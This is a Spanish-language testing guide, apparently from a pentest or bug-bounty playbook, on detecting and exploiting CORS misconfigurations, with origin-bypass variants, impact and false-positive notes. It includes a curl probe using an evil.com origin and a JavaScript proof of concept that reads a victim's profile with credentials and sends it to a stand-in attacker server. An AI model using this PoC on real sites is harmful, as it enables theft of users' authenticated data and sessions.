# CORS — Cross-Origin Resource Sharing Misconfiguration

## Señales de entrada
- Header `Access-Control-Allow-Origin: *` en endpoints autenticados.
- Header `Access-Control-Allow-Credentials: true` junto con origen reflejado.
- APIs que reflejan el valor del header `Origin` en `Access-Control-Allow-Origin`.
- Endpoints de API con datos sensibles accesibles via GET/POST.

## Metodología

### Paso 1: identificar endpoints con CORS
```bash
# Buscar headers CORS en respuestas
curl -s -I -H "Origin: https://evil.com" https://api.example.com/api/v1/user/profile

# Respuesta vulnerable:
# Access-Control-Allow-Origin: https://evil.com
# Access-Control-Allow-Credentials: true
```

### Paso 2: probar variaciones de origen
```
# Reflejo de origen arbitrario
Origin: https://evil.com

# Bypass con subdominio
Origin: https://evil.example.com
Origin: https://notexample.com
Origin: https://example.com.evil.com

# Null origin
Origin: null

# Protocolo diferente
Origin: http://example.com  (si el target es HTTPS)
```

### Paso 3: confirmar explotabilidad
```javascript
// PoC: fetch con credenciales desde origen externo
fetch('https://api.example.com/api/v1/user/profile', {
  credentials: 'include'
})
.then(r => r.json())
.then(data => {
  // exfiltrar datos a servidor propio
  fetch('https://tuservidor.com/log?data=' + JSON.stringify(data))
})
```

### Casos especiales
- `ACAO: *` sin `credentials: true` → impacto bajo (no envía cookies).
- Origen reflejado + `credentials: true` → impacto alto (roba sesión).
- `Origin: null` aceptado → explotable via iframe sandbox.
- Whitelist mal implementada: `example.com` acepta `evilexample.com`.

## Impacto alto
- Leer datos autenticados del usuario desde un sitio externo.
- Robo de tokens, PII, información de cuenta.
- Ejecutar acciones autenticadas (POST, PUT, DELETE) desde origen externo.

## Falsos positivos
- `ACAO: *` sin `credentials: true` en endpoint público → por diseño.
- Origen reflejado pero sin datos sensibles en el endpoint.
- Endpoint solo acepta GET de recursos públicos.

## Evidencia mínima
- Request con `Origin: https://evil.com` y respuesta con `ACAO: https://evil.com` + `ACAC: true`.
- PoC HTML que hace fetch con cookies y recibe datos del usuario autenticado.
- Datos sensibles visibles en la respuesta del fetch.
